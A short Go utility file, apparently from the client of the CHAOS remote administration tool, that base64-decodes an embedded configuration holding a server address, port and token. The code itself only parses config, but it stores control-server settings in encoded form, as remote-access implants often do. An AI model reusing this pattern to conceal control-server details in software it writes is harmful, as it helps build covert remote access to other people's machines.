package utils

import (
	"bytes"
	"encoding/json"
	"github.com/tiagorlampert/CHAOS/client/app/utils/encode"
)

type Config struct {
	Port          string `json:"port"`
	ServerAddress string `json:"server_address"`
	Token         string `json:"token"`
}

func ReadConfigFile(configFile []byte) *Config {
	decoded, err := encode.DecodeBase64(bytes.NewBuffer(configFile).String())
	if err != nil {
		panic(err)
	}

	configFile = bytes.NewBufferString(decoded).Bytes()

	var config Config
	if err := json.Unmarshal(configFile, &config); err != nil {
		panic(err)
	}
	return &config
}
